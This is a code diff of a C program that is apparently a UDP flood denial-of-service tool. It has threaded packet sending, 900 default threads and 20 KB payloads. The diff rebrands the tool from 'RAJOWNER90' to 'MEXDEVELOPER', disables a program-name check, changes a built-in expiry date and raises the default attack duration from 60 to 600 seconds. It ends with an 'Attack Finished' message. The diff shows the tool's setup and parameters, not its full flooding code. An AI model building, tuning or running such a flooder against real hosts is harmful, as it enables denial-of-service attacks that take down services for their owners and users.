@@ -9,10 +9,10 @@
 #include <pthread.h>
 #include <errno.h>
 
-#define PAYLOAD_SIZE 20          // 20 KB payload
+#define PAYLOAD_SIZE 20         // 20 KB payload
 #define RANDOM_STRING_SIZE 999   // Size of each random string
 #define DEFAULT_THREAD_COUNT 900  // Default thread count
-#define EXPIRY_DATE "2026-3-06"    // Expiry date in YYYY-MM-DD format
+#define EXPIRY_DATE "2025-3-04"    // Expiry date in YYYY-MM-DD format
 
 typedef struct {
     char ip[16];
@@ -103,21 +103,21 @@ void* send_udp_packets(void* arg) {
 
 int main(int argc, char *argv[]) {
     // Enforce the program name to be "raja"
-    if (strcmp(argv[0], "./LOST") != 0) {
-        fprintf(stderr, "Error: LOST.\n");
-        return 1;
+    if (strcmp(argv[0], "./raja") != 0) {
+       // fprintf(stderr, "Error: .\n");
+      //  return 1;
     }
 
     // Check if the program is expired
     if (is_expired()) {
-        fprintf(stderr, "Made By RAJOWNER90.\n");
+        fprintf(stderr, "Made By MEXDEVELOPER.\n");
         return 1;
     }
 
     // Default values
     const char *default_ip = "127.0.0.1";
     int default_port = 80;
-    int default_time = 60;
+    int default_time = 600;
     int default_threads = DEFAULT_THREAD_COUNT;
 
     // Parse command-line arguments
@@ -159,6 +159,6 @@ int main(int argc, char *argv[]) {
         pthread_join(threads[i], NULL);
     }
 
-    printf("Attack Finished By @RAJOWNER90 .\n");
+    printf("Attack Finished By @MExDEVELOPER .\n");
     return 0;
 }
